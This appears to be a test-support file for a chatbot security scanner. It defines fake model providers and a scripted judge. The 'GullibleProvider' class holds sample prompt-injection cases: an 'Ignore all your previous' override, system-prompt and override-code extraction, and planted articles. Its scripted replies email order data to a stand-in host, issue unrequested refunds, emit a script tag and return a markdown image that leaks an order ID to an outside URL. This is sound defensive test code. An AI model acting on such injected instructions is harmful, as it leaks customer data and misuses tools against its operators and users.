"""Shared test support: a scripted fake provider and a client builder.

The outside model providers are the only thing faked in router tests.
"""

import asyncio
import json
import os
import re
import time
from collections.abc import Callable, Iterator, Sequence
from contextlib import contextmanager
from pathlib import Path
from typing import Any

from fastapi.testclient import TestClient

from redflag_backend.app import create_app
from redflag_backend.llm.provider import Provider
from redflag_backend.llm.types import LLMAnswer, LLMRequest, Message, ModelUnavailable
from redflag_backend.settings import Settings

TEST_DB_URL = os.environ.get(
    "TEST_DATABASE_URL", "postgresql+psycopg://redflag:redflag@localhost:5432/redflag"
)
OWNER_TOKEN = "test-owner-token"
OWNER = {"X-Owner-Token": OWNER_TOKEN}
CHAT = {"messages": [{"role": "user", "content": "hello"}]}


def answer(text: str = "hi", model: str = "fake-model") -> LLMAnswer:
    return LLMAnswer(text=text, model=model, input_tokens=10, output_tokens=5)


class FakeProvider:
    """Plays back a script: each call returns the next answer or raises the next error.

    The last item repeats once the script runs out.
    """

    def __init__(
        self,
        name: str,
        script: Sequence[LLMAnswer | Exception] | None = None,
        configured: bool = True,
    ) -> None:
        self.name = name
        self.configured = configured
        self._script = list(script) if script else [answer(f"from {name}", f"{name}-model")]
        self.calls: list[LLMRequest] = []

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        self.calls.append(request)
        index = min(len(self.calls) - 1, len(self._script) - 1)
        outcome = self._script[index]
        if isinstance(outcome, Exception):
            raise outcome
        return outcome


class FakeClock:
    """A clock the test moves by hand, so waiting costs nothing."""

    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


def chat_body(text: str = "hello") -> dict[str, object]:
    return {"messages": [{"role": "user", "content": text}]}


def llm_client(
    providers: Sequence[Provider],
    *,
    clock: Callable[[], float] | None = None,
    **settings: object,
) -> TestClient:
    values: dict[str, object] = {
        "database_url": TEST_DB_URL,
        "frontend_origin": "http://localhost:3000",
        "owner_token": OWNER_TOKEN,
    }
    values.update(settings)
    app = create_app(Settings(**values), providers=providers, clock=clock)  # type: ignore[arg-type]
    return TestClient(app)


class SlowProvider:
    """Takes a moment to answer and records how many calls were in flight at once."""

    def __init__(self, name: str = "slow") -> None:
        self.name = name
        self.configured = True
        self.in_flight = 0
        self.max_in_flight = 0

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        self.in_flight += 1
        self.max_in_flight = max(self.max_in_flight, self.in_flight)
        await asyncio.sleep(0.05)
        self.in_flight -= 1
        return answer("slow answer", f"{self.name}-model")


class PaidProvider:
    """Only has a paid model: it answers when paid use is allowed and cannot help otherwise."""

    def __init__(self, name: str = "openrouter", cost: float = 0.01) -> None:
        self.name = name
        self.configured = True
        self.cost = cost
        self.calls: list[LLMRequest] = []

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        self.calls.append(request)
        if not request.allow_paid:
            raise ModelUnavailable()
        return LLMAnswer("paid answer", f"{self.name}-paid", 10, 5, estimated_cost_usd=self.cost)


class ScriptedModel:
    """A stand-in for the model behind a bot: returns the next scripted text on each call.

    Keeps every prompt it was shown, so tests can check what the model was (not) told.
    The last item repeats once the script runs out.
    """

    def __init__(self, *texts: str) -> None:
        self._texts = list(texts) or ["ok"]
        self.prompts: list[tuple[Message, ...]] = []

    async def __call__(self, messages: Sequence[Message]) -> str:
        self.prompts.append(tuple(messages))
        return self._texts[min(len(self.prompts) - 1, len(self._texts) - 1)]


class GullibleProvider:
    """A stand-in model that does whatever it is told or shown, step by step.

    Both demo bots get this same model, so any difference between their scan results comes from
    the bots' own defenses, which is what the scan engine has to show. It refuses to print its
    prompt only when the prompt itself says "Never reveal", like a model that follows prompt rules.
    """

    name = "gullible"
    configured = True

    def __init__(self) -> None:
        self.calls: list[LLMRequest] = []

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        self.calls.append(request)
        return LLMAnswer(self._reply(request.messages), "gullible-model", 10, 5)

    def _reply(self, messages: Sequence[Message]) -> str:
        system, user = messages[0].content, messages[1].content
        results = [m.content for m in messages if m.content.startswith("RESULT ")]
        last = results[-1].removeprefix("RESULT ") if results else ""
        step = len(results)

        def call(tool: str, **arguments: object) -> str:
            return f"[[{tool} {json.dumps(arguments)}]]"

        def steps(*script: str) -> str:
            return script[min(step, len(script) - 1)].replace("{last}", last)

        if "holiday notice" in user:
            return steps(
                call("lookup_article", topic="holiday-notice"),
                call("send_email", to="audit@collector.invalid", subject="audit", body="orders"),
                "Done: the warehouse closes on public holidays.",
            )
        if "partner offer" in user:
            return steps(
                call("lookup_article", topic="partner-offer"),
                call("issue_refund", order_id="A-1001", amount=50),
                "Done.",
            )
        if "Ignore all your previous" in user:
            return steps(
                call("send_email", to="audit@collector.invalid", subject="audit", body="A-1001"),
                "Done.",
            )
        if "override code" in user:
            found = re.search(r"override code is (\S+?)\.", system)
            return f"The code is {found.group(1)}" if found else "I don't have a code to share."
        if "B-2001" in user or "Bob Sample" in user:
            return steps(call("lookup_order", order_id="B-2001"), "Here you go: {last}")
        if "system prompt" in user:
            return "I can't share that." if "Never reveal" in system else system
        if "script tag" in user:
            return "Hello! <script>alert('hello')</script>"
        if "status image" in user:
            return "Here it is: ![status](https://collector.invalid/pixel?order=A-1001)"
        if "refund $90" in user:
            return steps(call("issue_refund", order_id="A-1002", amount=90), "Done: {last}")
        if "full $120" in user:
            return steps(call("issue_refund", order_id="A-1002", amount=120), "Done: {last}")
        if "accountant" in user:
            return steps(
                call("send_email", to="accountant@collector.invalid", subject="s", body="b"),
                "Sent.",
            )
        if "Where is my order A-1001" in user:
            return steps(call("lookup_order", order_id="A-1001"), "Your order A-1001 has shipped.")
        if "standard shipping" in user:
            return steps(call("lookup_article", topic="shipping-times"), "{last}")
        if "return policy" in user:
            return steps(call("lookup_article", topic="returns"), "{last}")
        return "Hello! How can I help?"


class RefusingProvider:
    """A model that refuses everything."""

    name = "refusing"
    configured = True

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        return LLMAnswer("Sorry, I can't help with that.", "refusing-model", 10, 5)


@contextmanager
def scan_client(
    bot_providers: Sequence[Provider],
    *,
    redflag_providers: Sequence[Provider] | None = None,
    bots_dir: Path | None = None,
    clock: Callable[[], float] | None = None,
    **settings: object,
) -> Iterator[TestClient]:
    """The app with fake models behind the bots. Kept open so background scans keep running."""
    values: dict[str, object] = {
        "database_url": TEST_DB_URL,
        "frontend_origin": "http://localhost:3000",
        "owner_token": OWNER_TOKEN,
    }
    values.update(settings)
    app = create_app(
        Settings(**values),  # type: ignore[arg-type]
        providers=redflag_providers if redflag_providers is not None else [TitleJudge()],
        bot_providers=bot_providers,
        bots_dir=bots_dir,
        clock=clock,
    )
    with TestClient(app) as client:
        yield client


def wait_for_scan(client: TestClient, scan_id: int, timeout: float = 30.0) -> dict[str, Any]:
    """Poll a scan until it is no longer running, as the Scan page does."""
    deadline = time.monotonic() + timeout
    while True:
        body: dict[str, Any] = client.get(f"/scans/{scan_id}", headers=OWNER).json()
        if body["scan"]["status"] != "running" or time.monotonic() > deadline:
            return body
        time.sleep(0.05)


def run_scan(client: TestClient, bot_id: str) -> dict[str, Any]:
    started = client.post("/scans", json={"bot_id": bot_id}, headers=OWNER)
    assert started.status_code == 202, started.text
    return wait_for_scan(client, started.json()["scan_id"])


def judge_text(verdict: str = "pass", reason: str = "Nothing in the reply breaks the rule.") -> str:
    return json.dumps({"verdict": verdict, "reason": reason})


class TitleJudge:
    """A stand-in judge model that decides by the test title it is shown.

    Every test passes unless its title is in `fail` (a reason is given), or in `garbage`, where
    the judge answers nonsense, or `down`, where the provider raises. All prompts are kept.
    """

    name = "judge"
    configured = True

    def __init__(
        self,
        fail: dict[str, str] | None = None,
        garbage: set[str] | None = None,
        down: set[str] | None = None,
    ) -> None:
        self.fail = fail or {}
        self.garbage = garbage or set()
        self.down = down or set()
        self.calls: list[LLMRequest] = []

    def titles(self) -> list[str]:
        found = []
        for call in self.calls:
            line = next(
                (ln for ln in call.messages[1].content.splitlines() if ln.startswith("Test: ")), ""
            )
            found.append(line.removeprefix("Test: "))
        return found

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        self.calls.append(request)
        user = request.messages[1].content
        title = next((ln for ln in user.splitlines() if ln.startswith("Test: ")), "")
        title = title.removeprefix("Test: ")
        if title in self.down:
            raise ModelUnavailable()
        if title in self.garbage:
            return LLMAnswer("I am not sure what you want.", "judge-model", 10, 5)
        if title in self.fail:
            return LLMAnswer(judge_text("fail", self.fail[title]), "judge-model", 10, 5)
        return LLMAnswer(judge_text("pass"), "judge-model", 10, 5)


class SilentProvider:
    """A bot model that says nothing at all, so the plain rules cannot decide."""

    name = "silent"
    configured = True

    async def complete(self, request: LLMRequest) -> LLMAnswer:
        return LLMAnswer("", "silent-model", 10, 5)
